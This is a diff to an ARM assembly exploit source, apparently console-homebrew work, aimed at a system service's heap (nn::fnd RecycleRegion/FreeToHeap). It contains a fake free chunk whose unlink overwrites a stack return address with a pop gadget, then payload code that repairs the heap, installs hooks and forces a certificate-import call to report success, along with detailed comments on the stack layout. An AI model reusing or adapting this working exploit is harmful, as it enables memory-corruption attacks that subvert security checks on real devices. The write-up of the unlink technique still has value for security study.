@@ -1,10 +1,19 @@
 .arm
 
-.equ TARGET_RETURN_STACK_ADDR, 0x080C5DE4
+// address of the 'pop {r4-r6, pc}' instruction at the end of __cpp_initialize__aeabi_
+.equ POP_R4R5R6PC_ADDR, 0x08084E08+1
+
+// stack frame of nn::fnd::detail::RecycleRegion
+.equ RECYCLE_REGION_STACK_FRAME, 0x080C5DD0
+// location of the return address of nn::fnd::detail::RecycleRegion on the stack (returns to nn::fnd::detail::FreeToHeap)
+.equ RECYCLE_REGION_STACK_RETURN_ADDR, RECYCLE_REGION_STACK_FRAME+0x14
+
+.equ PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET, 0x30
+
 .equ TARGET_CHUNK_SIZE, 0x2800
 .equ MEMCHUNK_HDR_PREV, 0x8
 .equ MEMCHUNK_HDR_NEXT, 0xC
-.equ RETURN_CODE_STACK_OFFSET, 0x30
+.equ MEMCHUNK_HDR_SIZE, 0x10
 
 .equ PXIMC_SHUTDOWN_JUMP_TABLE_PTR, 0x08080E20
 .equ PXIMC_SWITCH_RETURN, 0x08080E64
@@ -15,40 +24,65 @@
 
 .equ HEAP_ALLOCATE, 0x0805A110
 
+
+/*
+  Here's the stack state when jumping to _start:
+
+  |------------------ RecycleRegion stack frame ------------------|
+  | 080C5DD0:   ...                                               |
+  | 080C5DD4:   ...                                               |
+  | 080C5DD8:   ...                                               |
+  | 080C5DDC:   ...                                               |
+  | 080C5DE0:   ...                                               |
+  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>|
+  |                                                               |
+  |-------------------- FreeToHeap stack frame -------------------|
+  | 080C5DE8:   ...                                               |
+  | 080C5DEC:   ...                                               |
+  | 080C5DF0:   ...                                               |
+  | 080C5DF4:   0x08??????    <pointer to _start (popped to pc)>  |
+  | 080C5DF8:   ...           <--- sp points here                 |
+  | 080C5DFC:   0x08053B3E+1  <return address>                    |
+  |---------------------------------------------------------------|
+
+  We gain control when returning from RecycleRegion, therefore we are "hooking"
+  the execution flow of FreeToHeap. So we first set sp = 0x080C5DE8 to match
+  with the FreeToHeap function stack frame, then we do our things and eventually
+  we return to the actual service code by doing 'pop {r2-r6, pc}' which is the
+  return instruction of FreeToHeap.
+*/
+
 .section    .text.start, "ax", %progbits
 .align      2
 .global     _start
 .type       _start, %function
 _start:
-  b _code_start
+  sub sp, sp, #0x10       // match sp with the FreeToHeap stack frame
 
-.org _start + MEMCHUNK_HDR_NEXT
-.word 0xDEADC0DE                                    // overwritten, garbage
-
-_code_start:
-  push {r2-r6}                                      // preserve original registers
-  mov r4, r2
-
-  ldr     r0, =__bss_start
-  mov     r1, #0
-  ldr     r2, =__bss_end
-  sub     r2, r2, r0
-  bl      memset
-
+  // clean .bss section
+  adr r1, _start
+  ldr r0, =__bss_start    // offset of .bss section start relative to _start
+  ldr r2, =__bss_end      // offset of .bss section end relative to _start
+  sub r2, r2, r0          // size of .bss section
+  add r0, r0, r1          // address of .bss section
+  mov r1, #0
+  bl memset               // memset(bss_section, 0, bss_section_size)
   /*
-    r2 holds a pointer to the free heap chunk that
-    contains this code (between _start and fake_free_chunk)
-    heapRepair remove it from the free list and repair fake_free_chunk
-    (we don't want it to be reallocated since it holds our code)
+    heapRepair removes the chunk that contains this code from the free list
+    (we don't want it to be reallocated since it holds our code) and then
+    repairs fake_free_chunk
   */
-  mov r0, r4
+  //adr r0, _start                  // r0 = &chunk_to_remove->data
+  //sub r0, r0, #MEMCHUNK_HDR_SIZE  // r0 = &chunk_to_remove
+  ldr r0, [sp]
   bl heapRepair
   bl installHooks
 
-  pop {r2-r6}                                       // restore regs
+  // change return code on stack to force success
   mov r0, #0
-  str r0, [sp, #RETURN_CODE_STACK_OFFSET]           // change return code on stack to force success
-  pop {r2-r6, pc}                                   // return to actual service code
+  str r0, [sp, #PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET]
+
+  pop {r2-r6, pc}         // last instruction of FreeToHeap, return to actual service code
 
 installHooks:
   ldr r0, =PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR
@@ -84,13 +118,73 @@ heapAllocate:
   bx r1
 
 /*
-  this is the fake chunk that trigger an arb write on the stack
-  it is repaired once we get code exec (see heapRepair)
+  This is the fake chunk that trigger an arb write on the stack
+  It is repaired once we get code exec (see heapRepair)
+
+  Here's the state of the stack when getting the arb write:
+  |------------------ RecycleRegion stack frame ------------------|
+  | 080C5DD0:   ...           <--- sp points here                 |
+  | 080C5DD4:   ...                                               |
+  | 080C5DD8:   ...                                               |
+  | 080C5DDC:   ...                                               |
+  | 080C5DE0:   ...                                               |
+  | 080C5DE4:   0x0803361E+1  <return address (FreeToHeap+0x24)>  |
+  |                                                               |
+  |-------------------- FreeToHeap stack frame -------------------|
+  | 080C5DE8:   ...                                               |
+  | 080C5DEC:   ...                                               |
+  | 080C5DF0:   ...                                               |
+  | 080C5DF4:   0x08??????    <pointer to _start>                 |
+  | 080C5DF8:   ...                                               |
+  | 080C5DFC:   0x08053B3E+1  <return address>                    |
+  |---------------------------------------------------------------|
+
+  Since the heap state is unknown at runtime we don't known the exact address of
+  _start, so we can't directly overwrite the return address of RecycleRegion to
+  make it points to _start.
+  Fortunately since our code is located in the buffer getting freed, we can find
+  its address in the FreeToHeap stack frame.
+  We overwrite the return address of RecycleRegion to make it point to the
+  'pop {r4-r6, pc}' instruction at the end of __cpp_initialize__aeabi_.
+  Of course, since it's an unlink exploit this also implies writing something
+  somewhere past the end of __cpp_initialize__aeabi_ but who cares? the code
+  section is writable and this specific part is only used at startup...
+
+  So in the end when unlinking this fake chunk we are doing:
+
+    *((RECYCLE_REGION_STACK_RETURN_ADDR - 0xC) + 0xC) = POP_R4R5R6PC_ADDR;
+    *(POP_R4R5R6PC_ADDR + 0x8) = RECYCLE_REGION_STACK_RETURN_ADDR - 0xC;
+
+  i.e:
+
+    // rewrite the return address
+    *(RECYCLE_REGION_STACK_RETURN_ADDR) = POP_R4R5R6PC_ADDR;
+    // write some garbage over an unused part of the code section
+    *(POP_R4R5R6PC_ADDR + 0x8) = RECYCLE_REGION_STACK_RETURN_ADDR - 0xC;
+
+  Here's the state of the stack after unlinking the chunk:
+  |------------------ RecycleRegion stack frame ------------------|
+  | 080C5DD0:   ...           <--- sp points here                 |
+  | 080C5DD4:   ...                                               |
+  | 080C5DD8:   ...                                               |
+  | 080C5DDC:   ...                                               |
+  | 080C5DE0:   ...                                               |
+  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>|
+  |                                                               |
+  |-------------------- FreeToHeap stack frame -------------------|
+  | 080C5DE8:   ...           <??? (will pop to r4)>              |
+  | 080C5DEC:   ...           <??? (will pop to r5)>              |
+  | 080C5DF0:   ...           <??? (will pop to r6)>              |
+  | 080C5DF4:   0x08??????    <pointer to _start (will pop to pc)>|
+  | 080C5DF8:   ...                                               |
+  | 080C5DFC:   0x08053B3E+1  <return address>                    |
+  |---------------------------------------------------------------|
+
+  So when returning from RecycleRegion, we directly jump to _start!
 */
 .section  .fake_free_chunk
-.global   fake_free_chunk
 fake_free_chunk:
-.word 0x00004652                                    // magic
-.word 0xDEADC0DE                                    // size
-.word _start                                        // prev
-.word TARGET_RETURN_STACK_ADDR - MEMCHUNK_HDR_PREV  // next
+.word 0x00004652                                            // magic
+.word 0x00000000                                            // size
+.word POP_R4R5R6PC_ADDR                                     // prev
+.word RECYCLE_REGION_STACK_RETURN_ADDR - MEMCHUNK_HDR_PREV  // next
